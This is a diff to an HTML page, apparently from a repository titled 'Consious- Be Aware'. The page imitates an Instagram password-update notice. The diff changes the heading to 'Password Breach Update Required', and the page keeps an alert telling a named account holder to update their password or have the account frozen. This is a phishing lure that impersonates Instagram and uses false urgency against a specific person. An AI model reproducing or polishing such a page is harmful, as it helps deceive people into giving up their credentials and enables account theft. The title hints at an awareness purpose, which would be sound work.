@@ -1,5 +1,5 @@
 # Consious-
-Be Aware
+Passkey Breach 
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,7 +13,7 @@ Be Aware
 <body>
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="insta-logo">
-    <h2>Password Update Required</h2>
+    <h2>Password Breach Update Required</h2>
     <div class="alert">
       To avoid freezing your Instagram account, naina_devadiga_ please update your password as soon as possible.
     </div>
